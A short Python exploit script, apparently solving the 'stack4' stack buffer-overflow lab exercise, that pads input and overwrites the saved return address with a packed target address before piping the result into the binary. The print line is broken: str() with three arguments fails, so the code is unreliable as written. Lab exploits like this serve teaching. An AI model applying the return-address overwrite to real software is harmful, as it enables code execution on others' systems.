import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp = "SSSS" # base pointer, neighborhood of return address
eip = struct.pack("I", 0x80483f4) # this is the memory address that we want to be at... struct converts integer to a binary string

print(str(padding, ebp, eip))

# exploit.py | ./stack4
